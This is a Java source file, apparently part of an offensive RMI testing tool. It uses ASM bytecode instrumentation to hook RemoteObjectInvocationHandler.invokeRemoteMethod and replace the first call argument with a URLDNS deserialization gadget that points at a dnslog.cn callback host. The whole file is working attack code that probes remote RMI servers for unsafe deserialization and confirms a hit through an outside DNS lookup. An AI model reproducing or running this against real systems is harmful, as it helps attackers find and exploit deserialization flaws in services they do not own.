package afanti.rasp.visitor;

import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;
import org.objectweb.asm.commons.AdviceAdapter;

public class RemoteObjectInvocationHandlerHookVisitor extends ClassVisitor{
    public String className;
    public RemoteObjectInvocationHandlerHookVisitor(ClassVisitor cv, String className){
        super(Opcodes.ASM5, cv);
        this.className = className;
    }
    @Override
    public MethodVisitor visitMethod(int access, String name, String desc,
                                     String signature, String[] exceptions) {
        MethodVisitor mv = super.visitMethod(access, name, desc, signature, exceptions);
        if ("invokeRemoteMethod".equals(name)) {
            mv = new RemoteObjectInvocationHandlerHookVisitorAdapter(mv, access, name, desc);
        System.out.println("afanti function invoke");
        }
        return mv;
    }

    public static class RemoteObjectInvocationHandlerHookVisitorAdapter extends AdviceAdapter {
        public RemoteObjectInvocationHandlerHookVisitorAdapter(MethodVisitor mv, int access, String name, String desc) {
            super(Opcodes.ASM5, mv, access, name, desc);
        }
        protected void onMethodEnter(){
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn("http://ctvi8v.dnslog.cn");
            mv.visitMethodInsn(INVOKESTATIC, "afanti/rasp/util/URLDNS", "getObject", "(Ljava/lang/String;)Ljava/lang/Object;", false);
            //调用方法
            mv.visitInsn(AASTORE);

        }
    }
}
